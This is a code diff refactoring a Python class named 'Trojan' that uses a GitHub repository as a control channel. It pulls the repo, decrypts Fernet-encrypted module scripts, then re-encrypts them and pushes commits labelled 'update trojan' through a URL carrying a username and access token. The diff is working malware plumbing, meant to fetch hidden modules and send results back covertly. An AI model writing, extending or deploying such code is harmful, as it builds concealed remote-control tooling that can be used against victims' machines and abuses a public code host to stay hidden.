@@ -53,22 +53,13 @@ class Trojan:
         origin = repo.remote("origin")
         origin.fetch()
         origin.pull(repo.active_branch.name)
-        module_files = repo.git.diff("--name-only", "HEAD@{1}..HEAD", "--", "scripts").split("\n")
-        for module_file in module_files:
-            if module_file.endswith(".py"):
-                module_path = os.path.join(self.local_dir, module_file)
-                self.decrypt_module(module_path)
+        self.decrypt_modules()
 
     def push_git_repo(self):
+        self.encrypt_modules()
         repo = Repo(self.local_dir)
-        repo.git.add("scripts/*.py")
+        repo.git.add(".")
         if repo.is_dirty() or repo.untracked_files:
-            module_files = repo.untracked_files + repo.git.diff("--name-only", "--cached").split("\n")
-            for module_file in module_files:
-                if module_file.endswith(".py"):
-                    module_path = os.path.join(self.local_dir, module_file)
-                    self.encrypt_module(module_path)
-
             repo.git.commit("-m", "update trojan")
             origin = repo.remote("origin")
             origin.set_url(f"https://{self.username}:{self.access_token}@github.com/{self.username}/{self.repo}.git")
@@ -87,25 +78,42 @@ class Trojan:
         with open('../key/public_key.key', 'wb') as key_file:
             key_file.write(key)
 
-    def encrypt_module(self, module_path):
-        with open(module_path, 'rb') as module_file:
-            module_content = module_file.read()
-        with open('../key/public_key.key', 'rb') as key_file:
-            key = key_file.read()
-        cipher = Fernet(key)
-        encrypted_content = cipher.encrypt(module_content)
-        with open(module_path, 'wb') as encrypted_module_file:
-            encrypted_module_file.write(encrypted_content)
+    def encrypt_modules(self):
+        key = self.load_encrypted_key()
+        module_dir = os.path.join(self.local_dir, "scripts")
+        for module_file in os.listdir(module_dir):
+            if module_file.endswith(".py"):
+                module_path = os.path.join(module_dir, module_file)
+                with open(module_path, 'rb') as file:
+                    module_content = file.read()
+                encrypted_content = self.encrypt(module_content, key)
+                with open(module_path, 'wb') as file:
+                    file.write(encrypted_content)
 
-    def decrypt_module(self, module_path):
-        with open(module_path, 'rb') as encrypted_module_file:
-            encrypted_content = encrypted_module_file.read()
+    def decrypt_modules(self):
+        key = self.load_encrypted_key()
+        module_dir = os.path.join(self.local_dir, "scripts")
+        for module_file in os.listdir(module_dir):
+            if module_file.endswith(".py"):
+                module_path = os.path.join(module_dir, module_file)
+                with open(module_path, 'rb') as file:
+                    module_content = file.read()
+                decrypted_content = self.decrypt(module_content, key)
+                with open(module_path, 'wb') as file:
+                    file.write(decrypted_content)
+
+    def encrypt(self, data, key):
+        fernet = Fernet(key)
+        return fernet.encrypt(data)
+
+    def decrypt(self, data, key):
+        fernet = Fernet(key)
+        return fernet.decrypt(data)
+
+    def load_encrypted_key(self):
         with open('../key/public_key.key', 'rb') as key_file:
             key = key_file.read()
-        cipher = Fernet(key)
-        decrypted_content = cipher.decrypt(encrypted_content)
-        with open(module_path, 'wb') as module_file:
-            module_file.write(decrypted_content)
+        return key
 
 
 def main():
